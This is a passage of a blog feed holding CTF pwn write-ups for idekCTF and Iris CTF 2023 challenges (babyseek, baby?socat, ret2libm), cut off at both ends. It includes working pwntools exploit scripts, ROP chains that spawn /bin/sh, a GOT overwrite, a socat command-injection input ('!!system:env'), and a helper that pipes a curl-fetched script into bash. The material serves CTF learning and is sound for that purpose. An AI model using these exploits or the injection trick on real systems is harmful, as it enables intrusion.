p64(pop_rdi)</span><br><span class="line">payload += p64(e.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(e.plt[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(e.address + <span class="number">0x1410</span>) <span class="comment"># main</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;feedback?\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">libc.address = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x84420</span></span><br><span class="line">info(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line"><span class="comment"># (3) system(&#x27;/bin/sh\x00&#x27;)</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;survey?\n&#x27;</span>, <span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;ctf?\n&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x12</span>-<span class="number">0x8</span>)</span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">0x8</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)))</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;feedback?\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">idek&#123;2_guess_typos_do_matter&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Iris CTF 2023 - babyseek (offset)</title>
      <link href="/230109-irisctf2023-babyseek/"/>
      <url>/230109-irisctf2023-babyseek/</url>
      
        <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>86 Solves (8.4% of users)<br>167 Points (500 Points)</p><h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><p>I’ll let you seek around my file as far as you want, but you can’t go anywhere since it’s &#x2F;dev&#x2F;null.<br><code>nc ret2libm.chal.irisc.tf 10004</code></p><p>To figure out where things are, you can use the gdb debugger. I recommend using a Docker instance, such as with the Dockerfile provided, to ensure you have an environment that matches the remote server you are attacking.</p><p>Hint!<br>You can find the location of functions in the Global Offset Table by using their name followed by @got.plt - for example, print &amp;‘<a href="mailto:&#x66;&#x77;&#x72;&#x69;&#116;&#101;&#64;&#103;&#x6f;&#116;&#46;&#x70;&#x6c;&#116;">&#x66;&#x77;&#x72;&#x69;&#116;&#101;&#64;&#103;&#x6f;&#116;&#46;&#x70;&#x6c;&#116;</a>‘.</p><p>By: sera</p><h3 id="for-player"><a href="#for-player" class="headerlink" title="for player"></a>for player</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── chal</span><br><span class="line">├── chal.c</span><br><span class="line">├── Dockerfile</span><br><span class="line">└── Makefile</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chal: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=25a1bb094d7ba8684d70c7686826e67352ceaf0b, for GNU/Linux 3.2.0, with debug_info, not stripped</span><br></pre></td></tr></table></figure><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><p>This challenge have a source code, So we can view the original source code ! :)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span> &#123;</span><br><span class="line">    system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    <span class="comment">// This is just setup</span></span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Your flag is located around %p.\n&quot;</span>, win);</span><br><span class="line"></span><br><span class="line">    FILE* null = fopen(<span class="string">&quot;/dev/null&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    <span class="type">int</span> pos = <span class="number">0</span>;</span><br><span class="line">    <span class="type">void</span>* super_special = &amp;win;</span><br><span class="line"></span><br><span class="line">    fwrite(<span class="string">&quot;void&quot;</span>, <span class="number">1</span>, <span class="number">4</span>, null);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;I&#x27;m currently at %p.\n&quot;</span>, null-&gt;_IO_write_ptr); <span class="comment">// [*]</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;I&#x27;ll let you write the flag into nowhere!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Where should I seek into? &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;pos);</span><br><span class="line">    null-&gt;_IO_write_ptr += pos; <span class="comment">// [**]</span></span><br><span class="line"></span><br><span class="line">    fwrite(&amp;super_special, <span class="keyword">sizeof</span>(<span class="type">void</span>*), <span class="number">1</span>, null);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Nice <code>win()</code> function which prints the flag. I like it.</p><p>Let’s see the <code>[*]</code> and <code>[**]</code> marking in code. First <code>[*]</code>, The <code>null</code> pointer is points to the <code>_IO_write_ptr</code> member of a <code>FILE</code> object. It points to the location where the file is being written to in memory. Before <code>[**]</code>, We can write the value to <code>pos</code>. It is add to the <code>null-&gt;_IO_write_ptr</code> at <code>[**]</code>, So <code>pos</code> is mean the offset.</p><p>The <code>frwite()</code> function attempt to write address of the <code>win()</code> to that offset, and then <code>exit()</code>.</p><h2 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h2><p>We can move the pointer that the file is being written to in memory.</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="Exploit-Scenario"><a href="#Exploit-Scenario" class="headerlink" title="Exploit Scenario"></a>Exploit Scenario</h3><p>Let’s overwrite the <code>GOT</code> of <code>exit()</code> which is called write after. We calculate the offset of <code>win()</code> to <code>exit@got.plt</code>.</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chal&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./chal&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;seek.chal.irisc.tf&#x27;</span>, <span class="number">10004</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">server</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;python3&#x27;</span>)</span><br><span class="line">    cmd = <span class="string">b&#x27;python3&#x27;</span> + p.recvline()[:-<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(cmd)</span><br><span class="line">    res = subprocess.check_output([<span class="string">&#x27;bash&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>, cmd])</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Solution?&#x27;</span>, res)</span><br><span class="line"></span><br><span class="line">server()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;located around&#x27;</span>)</span><br><span class="line">win = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;.&#x27;</span>)[:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">info(<span class="string">&#x27;win: &#x27;</span>+ <span class="built_in">hex</span>(win))</span><br><span class="line"></span><br><span class="line">e.address = win - e.sym[<span class="string">&#x27;win&#x27;</span>]</span><br><span class="line">info(<span class="string">&#x27;pie base: &#x27;</span> + <span class="built_in">hex</span>(e.address))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;currently at&#x27;</span>)</span><br><span class="line">curr = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;.&#x27;</span>)[:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">info(<span class="string">&#x27;curr: &#x27;</span> + <span class="built_in">hex</span>(curr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># move pos to exit@got</span></span><br><span class="line">offset = e.got[<span class="string">&#x27;exit&#x27;</span>] - curr</span><br><span class="line">info(<span class="built_in">hex</span>(offset))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;into?&#x27;</span>, <span class="built_in">str</span>(offset))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>In this CTF, Perhaps to prevent brute force, the following process is added when connecting to the server.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">== proof-of-work: enabled ==</span><br><span class="line">please solve a pow first</span><br><span class="line">You can run the solver with:</span><br><span class="line">    python3 &lt;(curl -sSL https://goo.gle/kctf-pow) solve s.ADQ6.AADPFiV0veQZlf8vJux482QM</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">Solution?</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">irisctf&#123;not_quite_fseek&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Iris CTF 2023 - baby?socat</title>
      <link href="/230109-irisctf2023-babysocat/"/>
      <url>/230109-irisctf2023-babysocat/</url>
      
        <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>22 Solves (2.1% of users)<br>478 Points (500 Points)</p><h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><p>love sockets and cats and socat and ls</p><p>Socat version on remote is 1.7.4.1<br><code>nc socat.chal.irisc.tf 10000</code></p><p>By: sera</p><p>The biggest clue to solving this problem is the SOCAT VERSION for intended solution.</p><h3 id="for-player"><a href="#for-player" class="headerlink" title="for player"></a>for player</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── chal.c</span><br><span class="line">└── run.sh</span><br></pre></td></tr></table></figure><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><p>X</p><h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> -n <span class="string">&quot;Give me your command: &quot;</span></span><br><span class="line"><span class="built_in">read</span> -e -r input</span><br><span class="line">input=<span class="string">&quot;exec:./chal ls <span class="variable">$input</span>&quot;</span></span><br><span class="line"></span><br><span class="line">FLAG=<span class="string">&quot;fakeflg&#123;REDACTED&#125;&quot;</span> socat - <span class="string">&quot;<span class="variable">$input</span>&quot;</span> 2&gt;&amp;0</span><br></pre></td></tr></table></figure><p>The <code>socat</code> is set up execute a <code>chal</code> binary with the parameters <code>ls</code> then the <code>input</code>.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(argc &lt; <span class="number">2</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span>(setenv(<span class="string">&quot;FLAG&quot;</span>, <span class="string">&quot;NO!&quot;</span>, <span class="number">1</span>) != <span class="number">0</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    execvp(argv[<span class="number">1</span>], argv+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The source code of chal binary is just sets the <code>FLAG</code> env empty.</p><h2 id="Vulnerability-amp-Solve-1-intended"><a href="#Vulnerability-amp-Solve-1-intended" class="headerlink" title="Vulnerability &amp; Solve 1 (intended)"></a>Vulnerability &amp; Solve 1 (intended)</h2><p>It would be good to refer to the public writeup for this part. For reference, the change log in the public writeup can be found at the <a href="https://pkgsrc.se/net/socat">pkgsrc.se&#x2F;net&#x2F;socat</a>.</p><ul><li><a href="https://github.com/Seraphin-/ctf/blob/master/irisctf2023/socat.md">https://github.com/Seraphin-/ctf/blob/master/irisctf2023/socat.md</a></li></ul><p>Finally, The <code>setenv(&quot;FLAG&quot;, &quot;NO!&quot;, 1)</code> is to help prevent any unintended solutions. It retains environment variable only during execution. It would be like I can print env with <code>ls</code>, but I can’t. I concentrated this part but it was a waste of time. I haven’t been able to solve this challenge.</p><h2 id="Solve-2-unintended"><a href="#Solve-2-unintended" class="headerlink" title="Solve 2 (unintended)"></a>Solve 2 (unintended)</h2><p>Looking at the Discord, there were many people who solved the challenge in this way. (I think it would be okay to use this solution for later. whenever..)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">socat [options] &lt;address&gt; &lt;address&gt;</span><br><span class="line"></span><br><span class="line">e.g.</span><br><span class="line">socat -d -d - TCP4:www.example.com:80</span><br></pre></td></tr></table></figure><p>As for the solution, here it is: <code>!!system:env</code></p><p>The <code>system</code> is type of socat address. If you use <code>!!</code>, two single addresses specifications can be combined to form a dual type address for one bytestream.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SYSTEM:&lt;shell-command&gt;</span><br><span class="line">Forks a sub process that establishes communication with its parent process and invokes the specified program with system() . Please note that &lt;shell-command&gt; [string] must not contain &#x27;,&#x27; or &quot;!!&quot;, and that shell meta characters may have to be protected. After successful program start, socat writes data to stdin of the process and reads from its stdout.</span><br></pre></td></tr></table></figure><p>You can find another type of socat address.:</p><ul><li><a href="http://www.dest-unreach.org/socat/doc/socat.html#ADDRESS_TYPES">www.dest-unreach.org/socat/doc/socat.html</a></li></ul><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><ul><li><a href="https://copyconstruct.medium.com/socat-29453e9fc8a6">https://copyconstruct.medium.com/socat-29453e9fc8a6</a></li><li><a href="http://www.dest-unreach.org/socat/doc/socat.html#ADDRESS_SPECIFICATIONS">http://www.dest-unreach.org/socat/doc/socat.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Iris CTF 2023 - ret2libm (simple BOF)</title>
      <link href="/230109-irisctf2023-ret2libm/"/>
      <url>/230109-irisctf2023-ret2libm/</url>
      
        <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>49 Solves (4.7% of users)<br>392 Points (500 Points)</p><h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><p>I need to make a pwn? Let’s go with that standard warmup rop thing… what was it… ret2libm?<br><code>nc ret2libm.chal.irisc.tf 10001</code></p><p>Hint!<br>The challenge server may be acting up. If your solution works locally and on the docker but not on remote, please open a ticket!</p><p>By: sera</p><h3 id="for-player"><a href="#for-player" class="headerlink" title="for player"></a>for player</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── chal</span><br><span class="line">├── chal.c</span><br><span class="line">├── libc-2.27.so</span><br><span class="line">├── libm-2.27.so</span><br><span class="line">└── Makefile</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chal: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=2c6fac9007a0e13f2ca1978d85d974afb7fd03d9, not stripped</span><br></pre></td></tr></table></figure><p>This challenge use a <code>libc-2.27.so</code> So enviroment seems to Ubuntu 18.04 that different to me. That enviroment is different from mine, I downloaded <code>ld</code> file with docker. And then I patched it. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[jir4vvit@arch ret2libm]$ ldd chal</span><br><span class="line">linux-vdso.so.1 (0x00007fff13dc7000)</span><br><span class="line">./libm-2.27.so (0x00007fbe43800000)</span><br><span class="line">./libc-2.27.so (0x00007fbe43400000)</span><br><span class="line">./ld-2.27.so =&gt; /usr/lib64/ld-linux-x86-64.so.2 (0x00007fbe43e9a000)</span><br></pre></td></tr></table></figure><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// gcc -fno-stack-protector -lm</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv)</span> &#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> yours[<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Check out my pecs: %p\n&quot;</span>, <span class="built_in">fabs</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;How about yours? &quot;</span>);</span><br><span class="line">    gets(yours);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s see how they stack up.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The challenge leaks the pointer to a <code>fabs</code> in libm.</p><h2 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h2><p>The <code>gets()</code> functions cause to <code>Buffer overflow</code>. We can change the <code>RIP</code>.</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="Exploit-Scenario"><a href="#Exploit-Scenario" class="headerlink" title="Exploit Scenario"></a>Exploit Scenario</h3><p>Just do it!</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chal&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./chal&#x27;, env = &#123;</span></span><br><span class="line">    <span class="comment"># &#x27;LD_PRELOAD&#x27; : &#x27;./libm-2.27.so&#x27;</span></span><br><span class="line">    <span class="comment"># &#125;)</span></span><br><span class="line"><span class="comment"># p = process(&#x27;./chal&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;ret2libm.chal.irisc.tf&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line">libm = ELF(<span class="string">&#x27;./libm-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">server</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;python3&#x27;</span>)</span><br><span class="line">    cmd = <span class="string">b&#x27;python3&#x27;</span> + p.recvline()[:-<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(cmd)</span><br><span class="line">    res = subprocess.check_output([<span class="string">&#x27;bash&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>, cmd])</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Solution?&#x27;</span>, res)</span><br><span class="line"></span><br><span class="line">server()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;pecs:&#x27;</span>)</span><br><span class="line">leak = <span class="built_in">int</span>(p.recvline(), <span class="number">16</span>)</span><br><span class="line">info(<span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line">libm_base = leak - libm.sym[<span class="string">&#x27;fabsf64&#x27;</span>]</span><br><span class="line">info(<span class="built_in">hex</span>(libm_base))</span><br><span class="line"></span><br><span class="line">libc.address = libm_base - <span class="number">0x3f1000</span> </span><br><span class="line">info(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x8</span> + <span class="number">0x8</span>)</span><br><span class="line"><span class="comment"># payload += p64(libc.address + 0x02164f) # pop rdi</span></span><br><span class="line"><span class="comment"># payload += p64(next(libc.search(b&#x27;/bin/sh\x00&#x27;)))</span></span><br><span class="line"><span class="comment"># payload += p64(libc.address + 0x8aa) # ret</span></span><br><span class="line"><span class="comment"># payload += p64(libc.sym[&#x27;system&#x27;])`</span></span><br><span class="line"></span><br><span class="line">payload += p64(libm_base + <span class="number">0xbc37</span>) <span class="comment"># pop rdi</span></span><br><span class="line">payload += p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)))</span><br><span class="line">payload += p64(libm_base + <span class="number">0x2a2</span>) <span class="comment"># 